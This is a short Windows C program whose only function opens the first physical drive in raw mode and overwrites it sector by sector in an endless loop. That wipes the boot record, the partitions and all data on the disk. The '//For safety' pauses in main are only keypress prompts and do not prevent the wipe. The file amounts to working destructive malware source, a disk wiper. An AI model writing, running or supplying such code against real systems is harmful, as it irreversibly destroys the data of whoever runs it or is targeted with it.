typedef struct IUnknown IUnknown;

#include <Windows.h>
#include <stdio.h>

VOID DiskOverwriter(VOID)
{
	DWORD dwBytesWritten;
	char data[512];

	HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_FLAG_WRITE_THROUGH, 0);

	for (int i = 0; ; i++)
	{
		memset(data, i, sizeof(data));

		SetFilePointer(hDrive, 512 * i, NULL, FILE_BEGIN);

		if (WriteFile(hDrive, data, sizeof(data), &dwBytesWritten, NULL))
		{
			printf("%d - Sector done!\n", i);
		}
		else
		{
			printf("%d - Sector failed!\n", i);
		}
	}

	CloseHandle(hDrive);
}

int main(int argc, char* argv[])
{
	//For safety
	system("pause");
	system("pause");
	system("pause");
	system("pause");
	system("pause");

	DiskOverwriter();

	return 0;
}
